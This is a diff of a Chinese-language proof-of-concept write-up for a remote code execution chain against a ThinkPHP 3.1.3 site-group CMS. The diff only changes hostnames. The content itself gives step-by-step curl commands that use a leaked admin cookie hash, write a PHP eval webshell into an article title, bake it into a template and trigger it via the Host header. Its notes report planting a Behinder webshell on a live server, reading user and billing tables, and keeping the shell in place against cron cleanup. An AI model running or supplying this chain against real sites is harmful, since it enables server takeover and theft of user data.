@@ -9,7 +9,7 @@
 - **language**: bash
 - **source**: self
 - **verified**: 1
-- **verified_note**: 在 203.0.113.101（天花板主站，TP3.1.3 + 宝塔 + PHP5.6.40）实测完整打通：① 凭据 the+b515a2b93dbec89932bf86fec3466f44 打开 Home/Article 网关（3545B）；② edit_cont?id=14040 写 title → {"ba_id":"14040","ok":1,"ms":"编辑成功"}；③ get_html1 烘焙 → Index_example.com 343037B，'@eval' 偏移 28324；④ Host=target393.example.com POST / → 回显 OWNED176|Linux target400.example.com 3.10.0-862.6.3.el7.x86_64。随后用 eval 调 file_put_contents 固化冰蝎马到 /Public/www/main_r3_2cvq828k.php（647B，uid=www），经马用 mysqli 读通业务库 today（admin 11 行 / user 615 行 / bills 1552 行）。无需认证前提：get_html1 零凭证；需要一份有效 (username, admin.password)。
+- **verified_note**: 在 203.0.113.101（天花板主站，TP3.1.3 + 宝塔 + PHP5.6.40）实测完整打通：① 凭据 the+b515a2b93dbec89932bf86fec3466f44 打开 Home/Article 网关（3545B）；② edit_cont?id=14040 写 title → {"ba_id":"14040","ok":1,"ms":"编辑成功"}；③ get_html1 烘焙 → Index_example.com 343037B，'@eval' 偏移 28324；④ Host=zsm1girvry.mrummy2rbv.xyz POST / → 回显 OWNED176|Linux FhMERQWC.VM.com 3.10.0-862.6.3.el7.x86_64。随后用 eval 调 file_put_contents 固化冰蝎马到 /Public/www/main_r3_2cvq828k.php（647B，uid=www），经马用 mysqli 读通业务库 today（admin 11 行 / user 615 行 / bills 1552 行）。无需认证前提：get_html1 零凭证；需要一份有效 (username, admin.password)。
 - **path**: pocs/thinkphp3.1.3-站群-cms-通杀-rce-admin-表哈希即凭据-home-article-edit_cont-写-article.title/tp313-sitegroup-rce-chain.md
 - **tags**: ThinkPHP3.1.3,站群,RCE,模板烘焙,article.title,get_html1,open_basedir,Host头,admin哈希轮换
 - **created_at**: 2026-10-13T12:05:51.831Z
@@ -74,18 +74,18 @@ file_put_contents("./App/Tpl/Home/Index_example.com", file_get_contents($url));
 ## 三、完整复现（176 实测通过）
 ```bash
 # ① 打开网关（176 上唯一有效对；用户名靠 allopen 的 touser 零凭证枚举）
-curl -k -s --noproxy '*' -H "Host: target399.example.com" \
+curl -k -s --noproxy '*' -H "Host: example.top" \
   -H "Cookie: admin_user=the; admin_id=b515a2b93dbec89932bf86fec3466f44" \
   "https://<IP>/example.com?g=Home&m=Article&a=allopen&allid=1_2_3" -o o.html -w '%{size_download}\n'
 #   3545 = 通过；3 = 被网关拦。枚举用户名：grep -oE 'title="[^"]{1,40}"' o.html | sort -u
 # ② 写 payload（★ id 必须走 GET，放进 POST body 会让 save($arr) 失败 → {"ok":0,"ms":"编辑失败"}）
-curl -k -s --noproxy '*' -X POST -H "Host: target399.example.com" \
+curl -k -s --noproxy '*' -X POST -H "Host: example.top" \
   -H "Cookie: admin_user=the; admin_id=b515a2b93dbec89932bf86fec3466f44" \
   --data 'cid=5100&title=<?php @eval(@$_POST["x"]);?>&cont=1&cont1=1' \
   "https://<IP>/example.com?g=Home&m=Article&a=edit_cont&id=14040"
 #   → {"ba_id":"14040","ok":1,"ms":"编辑成功"}
 # ③ 零凭证烘焙
-curl -k -s --noproxy '*' -H "Host: target399.example.com" "https://<IP>/example.com?g=Home&m=Order&a=get_html1"
+curl -k -s --noproxy '*' -H "Host: example.top" "https://<IP>/example.com?g=Home&m=Order&a=get_html1"
 # ④ 触发（Host 必须是"第三者域名"：不含 sp、不含 example，且 DNS 指向该 IP）
 curl -k -s --noproxy '*' -X POST -H "Host: <third-party-domain-resolving-to-IP>" \
   --data 'x=echo "OWNED";' "https://<IP>/"
@@ -95,7 +95,7 @@ curl -k -s --noproxy '*' -X POST -H "Host: <third-party-domain-resolving-to-IP>"
 ## 四、★ 复现时必踩的五个坑（每一个都真实吃掉过时间）
 1. **`edit_cont` 的 `id` 必须走 GET query**；放进 POST body 会让 `$arr=$_POST` 里的 `id` 一起进 SET 子句 → `save()` 失败 → `{"ok":0,"ms":"编辑失败"}`（但 HTTP 200，极易误判）。
 2. **触发用的 Host 不能含 `sp`、不能含 `example`** —— `Home/Index::index` 按 Host 分支：含 sp → display("indexapp")；含 example → 防封页；否则才走 display()（我们要的那支）。
-3. **`get_html1` 抓的是它【自己】**（`*.target395.example.com` 是自指解析），所以"控制抓取源"这条路是死的 —— 不要在这上面浪费时间；但"抓自己"正好让我们用 DB 内容喂它。
+3. **`get_html1` 抓的是它【自己】**（`*.abrdns.com` 是自指解析），所以"控制抓取源"这条路是死的 —— 不要在这上面浪费时间；但"抓自己"正好让我们用 DB 内容喂它。
 4. **站点 cron 约每 30 分钟重跑 `get_html1()`**，会把 Index_example.com 还原 ⇒ **模板落马会自然消失，必须用 eval 立刻把马固化成 .php 文件**。
 5. **任意 admin 注意**：该 CMS 的 `admin` 表 **password 存的就是 getpass 结果**，登录后 cookie 直接是 (username, password) 明文对 ⇒ **拿到 admin 表 = 等价后台接管**（不需要破解明文）。
 
@@ -116,7 +116,7 @@ protected function getpass($p){ return md5(C('cfg_adminkey').md5($p)); }
 
 ## 七、Host 头是这类站群的第二个总开关
 **vhost 按 Host 匹配。** 同一 IP 上：
-- `Host: target399.example.com` → 正常站点（且是 Admin 组可接受的 Host 之一）
+- `Host: example.top` → 正常站点（且是 Admin 组可接受的 Host 之一）
 - `Host: <站点自己的长域名>` → 也能进，但某些行为（Admin 302、888 端口 403）会失真
 - `Host: <裸IP>` → 403 / 289B
 ⇒ 打不通时，**先把 Host 换成"能解析到该 IP 的各种域名"逐个试**，比换 payload 有效得多。
